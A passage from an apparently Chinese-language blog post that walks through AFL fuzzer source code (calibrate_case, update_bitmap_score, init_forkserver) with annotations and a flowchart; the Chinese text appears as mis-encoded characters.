class="built_in">count_bytes</span>(var_bytes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!q-&gt;var_behavior) &#123;</span><br><span class="line">      <span class="built_in">mark_as_variable</span>(q);</span><br><span class="line">      queued_variable++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_name = old_sn;</span><br><span class="line">  stage_cur  = old_sc;</span><br><span class="line">  stage_max  = old_sm;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!first_run) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fault;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p><ul><li><p>argv: ä¼ é€’ç»™ç›®æ ‡ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°æ•°ç»„</p></li><li><p>q: æŒ‡å‘å½“å‰æµ‹è¯•ç”¨ä¾‹çš„é˜Ÿåˆ—æ¡ç›®</p></li><li><p>use_mem: æµ‹è¯•ç”¨ä¾‹çš„å†…å®¹ï¼ˆå†…å­˜ä¸­ï¼‰</p></li><li><p>handicap: æµ‹è¯•ç”¨ä¾‹çš„æ€§èƒ½æƒ©ç½šå€¼</p></li><li><p>from_queue: æ ‡å¿—ä½ï¼Œè¡¨ç¤ºæ˜¯å¦ä»é˜Ÿåˆ—ä¸­è°ƒç”¨ï¼ˆè€Œéåˆå§‹å¤„ç†ï¼‰</p></li></ul><p><strong>è¿”å›å€¼ï¼š</strong></p><ul><li><p>FAULT_NONE: æ­£å¸¸æ‰§è¡Œ</p></li><li><p>FAULT_TMOUT: æ‰§è¡Œè¶…æ—¶</p></li><li><p>FAULT_CRASH: ç¨‹åºå´©æºƒ</p></li><li><p>FAULT_ERROR: æ‰§è¡Œé”™è¯¯</p></li><li><p>FAULT_NOINST: æœªæ£€æµ‹åˆ°æ’æ¡©</p></li><li><p>FAULT_NOBITS: æœªäº§ç”Ÿæ–°çš„è¦†ç›–ä½</p></li></ul><p><strong>ä¸€äº›å˜é‡ï¼š</strong></p><ul><li><p>first_trace: å­˜å‚¨ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶çš„è¦†ç›–ç‡ä¿¡æ¯</p></li><li><p>fault: æ‰§è¡Œç»“æœçŠ¶æ€</p></li><li><p>new_bits: æ˜¯å¦å‘ç°æ–°çš„è¦†ç›–ä½</p></li><li><p>var_detected: æ˜¯å¦æ£€æµ‹åˆ°å˜å¼‚è¡Œä¸º</p></li><li><p>hnb: ä¸´æ—¶å­˜å‚¨ has_new_bits çš„ç»“æœ</p></li><li><p>first_run: æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œæ­¤æµ‹è¯•ç”¨ä¾‹</p></li><li><p>start_us, stop_us: è®°å½•æ‰§è¡Œæ—¶é—´</p></li><li><p>ä¿å­˜å½“å‰é˜¶æ®µä¿¡æ¯ï¼Œä»¥ä¾¿åç»­æ¢å¤</p></li></ul></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">  <span class="built_in">init_forkserver</span>(argv);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆå§‹åŒ–forkserver</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">  hnb = <span class="built_in">has_new_bits</span>(virgin_bits);</span><br><span class="line">  <span class="keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæµ‹è¯•ç”¨ä¾‹å·²æœ‰æ ¡éªŒå’Œï¼Œé‚£ä¹ˆç›´æ¥è¦†ç›–ç„¶åæ£€æŸ¥æ˜¯å¦æœ‰æ–°çš„è¦†ç›–ä½</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start_us = <span class="built_in">get_cur_time_us</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line">  <span class="comment">// æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹å¹¶åˆ†æç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop_us = <span class="built_in">get_cur_time_us</span>();</span><br></pre></td></tr></table></figure><p>è®°å½•å¼€å§‹å’Œç»“æŸçš„æ—¶é—´</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">u32 cksum;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">write_to_testcase</span>(use_mem, q-&gt;len);</span><br><span class="line"></span><br><span class="line">fault = <span class="built_in">run_target</span>(argv, use_tmout);</span><br></pre></td></tr></table></figure><ul><li><p>å¦‚æœä¸æ˜¯é¦–æ¬¡è¿è¡Œï¼Œå®šæœŸæ›´æ–°ç»Ÿè®¡ä¿¡æ¯</p></li><li><p>å°†æµ‹è¯•ç”¨ä¾‹å†™å…¥æ–‡ä»¶</p></li><li><p>è¿è¡Œç›®æ ‡ç¨‹åºå¹¶è·å–æ‰§è¡Œç»“æœ</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stop_soon || fault != crash_mode) <span class="keyword">goto</span> abort_calibration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !<span class="built_in">count_bytes</span>(trace_bits)) &#123;</span><br><span class="line">  fault = FAULT_NOINST;</span><br><span class="line">  <span class="keyword">goto</span> abort_calibration;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœæ”¶åˆ°åœæ­¢ä¿¡å·æˆ–æ‰§è¡Œç»“æœä¸å´©æºƒæ¨¡å¼ä¸ç¬¦ï¼Œä¸­æ­¢æ ¡å‡†</p><p>å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å¾ªç¯ä¸”æœªæ£€æµ‹åˆ°è¦†ç›–ä½ï¼Œè®¾ç½® FAULT_NOINST å¹¶ä¸­æ­¢æ ¡å‡†</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;</span><br><span class="line">      hnb = <span class="built_in">has_new_bits</span>(virgin_bits);</span><br><span class="line">    <span class="keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line">      <span class="comment">// å·²æœ‰æ ¡éªŒå’Œï¼Œæ£€æµ‹å˜å¼‚è¡Œä¸º</span></span><br><span class="line">      u32 i;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;</span><br><span class="line">          var_bytes[i] = <span class="number">1</span>;</span><br><span class="line">          stage_max    = CAL_CYCLES_LONG;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      var_detected = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// é¦–æ¬¡æ‰§è¡Œï¼Œè®°å½•æ ¡éªŒå’Œå’Œè¦†ç›–ä½å›¾</span></span><br><span class="line">      q-&gt;exec_cksum = cksum;</span><br><span class="line">      <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå·²æœ‰æ ¡éªŒå’Œä½†å½“å‰æ ¡éªŒå’Œä¸åŒï¼Œåˆ™é€ä½æ¯”è¾ƒè¦†ç›–ä½å›¾ï¼Œæ ‡è®°å˜å¼‚ä½ç½®ï¼Œå¹¶å»¶é•¿æ ¡å‡†å¾ªç¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">total_cal_us     += stop_us - start_us;</span><br><span class="line">total_cal_cycles += stage_max;</span><br><span class="line"></span><br><span class="line">q-&gt;exec_us     = (stop_us - start_us) / stage_max;</span><br><span class="line">q-&gt;bitmap_size = <span class="built_in">count_bytes</span>(trace_bits);</span><br><span class="line">q-&gt;handicap    = handicap;</span><br><span class="line">q-&gt;cal_failed  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">total_bitmap_size += q-&gt;bitmap_size;</span><br><span class="line">total_bitmap_entries++;</span><br><span class="line"></span><br><span class="line"><span class="built_in">update_bitmap_score</span>(q);</span><br></pre></td></tr></table></figure><p>ä¹‹åä¼šè®¡ç®—ç»Ÿè®¡çš„æ•°æ®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits) fault = FAULT_NOBITS;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯é¦–æ¬¡è¿è¡Œï¼Œä¸”æœªäº§ç”Ÿæ–°çš„è¦†ç›–ä½ï¼Œå°±ä¼šæ ‡è®°ä¸º<code>FAULT_NOBITS</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abort_calibration:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (new_bits == <span class="number">2</span> &amp;&amp; !q-&gt;has_new_cov) &#123;</span><br><span class="line">  q-&gt;has_new_cov = <span class="number">1</span>;</span><br><span class="line">  queued_with_cov++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœäº§ç”Ÿäº†æ–°çš„è·¯å¾„è¦†ç›–ï¼Œåˆ™mark</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var_detected) &#123;</span><br><span class="line">  var_byte_count = <span class="built_in">count_bytes</span>(var_bytes);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!q-&gt;var_behavior) &#123;</span><br><span class="line">    <span class="built_in">mark_as_variable</span>(q);</span><br><span class="line">    queued_variable++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæœ‰å˜å¼‚è¡Œä¸ºï¼Œè®¡ç®—å˜å¼‚å­—èŠ‚æ•°ï¼Œå¹¶markæµ‹è¯•ç”¨ä¾‹ä¸ºå˜å¼‚è¡Œä¸º</p><p>æ€»çš„æ¥è¯´å°±æ˜¯ï¼š</p><ul><li><p>è¿è¡Œç›®æ ‡ç¨‹åºå¤šæ¬¡ï¼ˆé€šå¸¸æ˜¯8æ¬¡ï¼Œç”± CAL_CYCLES å®šä¹‰ï¼‰</p></li><li><p>æ”¶é›†æ‰§è¡Œä¿¡æ¯ï¼Œå¦‚æ‰§è¡Œæ—¶é—´ã€ä»£ç è¦†ç›–ç‡ç­‰</p></li><li><p>æ£€æµ‹ç¨‹åºè¡Œä¸ºæ˜¯å¦ç¨³å®šï¼ˆæ¯æ¬¡è¿è¡Œæ˜¯å¦äº§ç”Ÿç›¸åŒçš„è¦†ç›–ç‡ï¼‰</p></li><li><p>è¿”å›æ‰§è¡Œç»“æœçŠ¶æ€ï¼ˆå¦‚æ­£å¸¸ã€è¶…æ—¶ã€å´©æºƒç­‰ï¼‰</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[å¼€å§‹ perform_dry_run] --&gt; B[&quot;åˆå§‹åŒ–å˜é‡&lt;br/&gt;q = queue&lt;br/&gt;cal_failures = 0&lt;br/&gt;skip_crashes = getenv&quot;]</span><br><span class="line">    B --&gt; C&#123;&quot;é˜Ÿåˆ—ä¸­è¿˜æœ‰æµ‹è¯•ç”¨ä¾‹?&lt;br/&gt;q != NULL&quot;&#125;</span><br><span class="line">    C --&gt;|æ˜¯| D[&quot;æå–æ–‡ä»¶å&lt;br/&gt;fn = strrchr + 1&quot;]</span><br><span class="line">    D --&gt; E[&quot;æ‰“å¼€æ–‡ä»¶&lt;br/&gt;fd = open O_RDONLY&quot;]</span><br><span class="line">    E --&gt; F&#123;æ–‡ä»¶æ‰“å¼€æˆåŠŸ?&#125;</span><br><span class="line">    F --&gt;|å¦| G[PFATAL é€€å‡º]</span><br><span class="line">    F --&gt;|æ˜¯| H[&quot;åˆ†é…å†…å­˜&lt;br/&gt;use_mem = ck_alloc_nozero&quot;]</span><br><span class="line">    H --&gt; I[&quot;è¯»å–æ–‡ä»¶å†…å®¹&lt;br/&gt;read fd, use_mem, q-&gt;len&quot;]</span><br><span class="line">    I --&gt; J&#123;è¯»å–å®Œæ•´?&#125;</span><br><span class="line">    J --&gt;|å¦| K[FATAL é€€å‡º]</span><br><span class="line">    J --&gt;|æ˜¯| L[&quot;å…³é—­æ–‡ä»¶&lt;br/&gt;close fd&quot;]</span><br><span class="line">    L --&gt; M[&quot;æ ¡å‡†æµ‹è¯•ç”¨ä¾‹&lt;br/&gt;res = calibrate_case&quot;]</span><br><span class="line">    M --&gt; N[&quot;é‡Šæ”¾å†…å­˜&lt;br/&gt;ck_free use_mem&quot;]</span><br><span class="line">    N --&gt; O&#123;stop_soon?&#125;</span><br><span class="line">    O --&gt;|æ˜¯| P[æå‰è¿”å›]</span><br><span class="line">    O --&gt;|å¦| Q[&quot;æ ¹æ®ç»“æœç±»å‹å¤„ç†&lt;br/&gt;switch res&quot;]</span><br><span class="line">    Q --&gt; R[&quot;FAULT_NONE: æ£€æŸ¥è¦†ç›–ç‡&quot;]</span><br><span class="line">    Q --&gt; S[&quot;FAULT_TMOUT: å¤„ç†è¶…æ—¶&quot;]</span><br><span class="line">    Q --&gt; T[&quot;FAULT_CRASH: å¤„ç†å´©æºƒ&quot;]</span><br><span class="line">    Q --&gt; U[&quot;FAULT_ERROR: æ‰§è¡Œé”™è¯¯&quot;]</span><br><span class="line">    Q --&gt; V[&quot;FAULT_NOINST: æ— æ’æ¡©&quot;]</span><br><span class="line">    Q --&gt; W[&quot;FAULT_NOBITS: æ— æ–°ä½&quot;]</span><br><span class="line">    R --&gt; X[æ£€æŸ¥å¯å˜è¡Œä¸º]</span><br><span class="line">    S --&gt; Y[å¢åŠ cal_failures]</span><br><span class="line">    T --&gt; Y</span><br><span class="line">    U --&gt; Z[FATAL é€€å‡º]</span><br><span class="line">    V --&gt; Z</span><br><span class="line">    W --&gt; AA[å¢åŠ useless_at_start]</span><br><span class="line">    X --&gt; BB[&quot;ç§»åˆ°ä¸‹ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹&lt;br/&gt;q = q-&gt;next&quot;]</span><br><span class="line">    Y --&gt; BB</span><br><span class="line">    AA --&gt; BB</span><br><span class="line">    BB --&gt; C</span><br><span class="line">    C --&gt;|å¦| CC&#123;&quot;æœ‰æ ¡å‡†å¤±è´¥?&lt;br/&gt;cal_failures &gt; 0&quot;&#125;</span><br><span class="line">    CC --&gt;|æ˜¯| DD[è¾“å‡ºå¤±è´¥ç»Ÿè®¡ä¿¡æ¯]</span><br><span class="line">    CC --&gt;|å¦| EE[&quot;è¾“å‡º All test cases processed&quot;]</span><br><span class="line">    DD --&gt; EE</span><br><span class="line">    EE --&gt; FF[ç»“æŸ]</span><br></pre></td></tr></table></figure><h3 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">update_bitmap_score</span><span class="params">(<span class="keyword">struct</span> queue_entry* q)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line">  u64 fav_factor = q-&gt;exec_us * q-&gt;len;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For every byte set in trace_bits[], see if there is a previous winner,</span></span><br><span class="line"><span class="comment">     and how it compares to us. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (trace_bits[i]) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (top_rated[i]) &#123;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Faster-executing or smaller test cases are favored. */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Looks like we&#x27;re going to win. Decrease ref count for the</span></span><br><span class="line"><span class="comment">            previous winner, discard its trace_bits[] if necessary. */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (!--top_rated[i]-&gt;tc_ref) &#123;</span><br><span class="line">           <span class="built_in">ck_free</span>(top_rated[i]-&gt;trace_mini);</span><br><span class="line">           top_rated[i]-&gt;trace_mini = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Insert ourselves as the new winner. */</span></span><br><span class="line"></span><br><span class="line">       top_rated[i] = q;</span><br><span class="line">       q-&gt;tc_ref++;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!q-&gt;trace_mini) &#123;</span><br><span class="line">         q-&gt;trace_mini = <span class="built_in">ck_alloc</span>(MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line">         <span class="built_in">minimize_bits</span>(q-&gt;trace_mini, trace_bits);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       score_changed = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æ˜¯AFLä¼˜åŒ–ç®—æ³•çš„ç¬¬ä¸€é˜¶æ®µï¼Œè´Ÿè´£ä¸ºæ¯ä¸ªè¦†ç›–ç‡ä½ç½®ç»´æŠ¤ä¸€ä¸ªâ€æœ€ä¼˜â€æµ‹è¯•ç”¨ä¾‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u64 fav_factor = q-&gt;exec_us * q-&gt;len;</span><br></pre></td></tr></table></figure><p><code>è¯„åˆ†å› å­=æ‰§è¡Œæ—¶é—´*æµ‹è¯•ç”¨ä¾‹æ–‡ä»¶çš„å¤§å°</code></p><p>è¯„åˆ†æ”¹å˜åªåœ¨ä»¥ä¸‹æƒ…å†µå‘ç”Ÿï¼š</p><p><strong>æ–°çš„è¦†ç›–ç‡ä½ç½®ï¼š</strong></p><ul><li><p>å½“ trace_bits[i] !&#x3D; 0 ä¸” top_rated[i] &#x3D;&#x3D; NULL</p></li><li><p>å³å‘ç°äº†å…¨æ–°çš„ä»£ç è¦†ç›–è·¯å¾„</p></li></ul><p><strong>æ›´ä¼˜çš„æµ‹è¯•ç”¨ä¾‹ï¼š</strong></p><ul><li><p>ç°æœ‰ä½ç½®æœ‰ç«äº‰è€…ï¼Œä½†æ–°æµ‹è¯•ç”¨ä¾‹è¡¨ç°æ›´å¥½</p></li><li><p><strong>new_fav_factor &lt; old_fav_factor</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len) <span class="keyword">continue</span>; <span class="comment">//è¦æ±‚ä¸¥æ ¼ä¼˜äº</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top_rated[i] = q;  <span class="comment">// è®¾ç½®æ–°çš„æœ€ä¼˜æµ‹è¯•ç”¨ä¾‹</span></span><br><span class="line">q-&gt;tc_ref++;       <span class="comment">// å¢åŠ å¼•ç”¨è®¡æ•°</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!--top_rated[i]-&gt;tc_ref) &#123;</span><br><span class="line">    <span class="built_in">ck_free</span>(top_rated[i]-&gt;trace_mini);</span><br><span class="line">    top_rated[i]-&gt;trace_mini = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡å°‘æ—§çš„ç”¨ä¾‹çš„å¼•ç”¨æ¬¡æ•°ï¼Œå¦‚æœä¸º0ï¼ˆå°±æ˜¯bitmapä¸Šæ¯ä¸€ä¸ªè·¯å¾„éƒ½ä¸æ˜¯è¿™ä¸ªæ—§çš„ç”¨ä¾‹çš„æœ€ä½³ç”¨ä¾‹ï¼‰ï¼Œå°±ä¼šé‡Šæ”¾<code>trace_mini</code>ï¼Œç„¶åæ ‡è®°<code>trace_mini=0</code>ï¼Œç„¶å</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!q-&gt;trace_mini) &#123;</span><br><span class="line">    q-&gt;trace_mini = <span class="built_in">ck_alloc</span>(MAP_SIZE &gt;&gt; <span class="number">3</span>);  <span class="comment">// åˆ†é…8KB</span></span><br><span class="line">    <span class="built_in">minimize_bits</span>(q-&gt;trace_mini, trace_bits); <span class="comment">// å‹ç¼©64KBåˆ°8KB</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ–°çš„æœ€ä½³æ²¡æœ‰trace_miniå°±ä¼šåˆ†é…ä¸€ä¸ªï¼Œç„¶åå°†64KBçš„è¦†ç›–ç‡ä¿¡æ¯å‹ç¼©ä¸º8KBçš„ä½å‘é‡</p><h2 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h2><p>å‚æ•°æ˜¯<code>char **argv</code>æŒ‡å‘ç›®æ ‡ç¨‹åºçš„å®Œæ•´è·¯å¾„ä»¥åŠä¸€äº›å‚æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> s32 forksrv_pid;      <span class="comment">// Fork serverè¿›ç¨‹ID</span></span><br><span class="line"><span class="type">static</span> s32 fsrv_ctl_fd;      <span class="comment">// æ§åˆ¶ç®¡é“æ–‡ä»¶æè¿°ç¬¦(å†™ç«¯)</span></span><br><span class="line"><span class="type">static</span> s32 fsrv_st_fd;       <span class="comment">// çŠ¶æ€ç®¡é“æ–‡ä»¶æè¿°ç¬¦(è¯»ç«¯)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORKSRV_FD          198    <span class="comment">// Fork serveré€šä¿¡åŸºç¡€æ–‡ä»¶æè¿°ç¬¦</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORK_WAIT_MULT      10     <span class="comment">// æ¡æ‰‹ç­‰å¾…æ—¶é—´å€æ•°</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">itimerval</span> it;</span><br><span class="line"><span class="type">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> status;</span><br><span class="line">s32 rlen;</span><br><span class="line"></span><br><span class="line"><span class="built_in">ACTF</span>(<span class="string">&quot;Spinning up the fork server...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pipe</span>(st_pipe) || <span class="built_in">pipe</span>(ctl_pipe)) <span class="built_in">PFATAL</span>(<span class="string">&quot;pipe() failed&quot;</span>);</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸¤ä¸ªç®¡é“ç”¨æˆ·è¿›ç¨‹é—´çš„é€šä¿¡</p><ul><li><p>st_pipe: çŠ¶æ€ç®¡é“ï¼Œfork server â†’ AFLä¸»è¿›ç¨‹</p></li><li><p>ctl_pipe: æ§åˆ¶ç®¡é“ï¼ŒAFLä¸»è¿›ç¨‹ â†’ fork server</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">forksrv_pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (forksrv_pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span 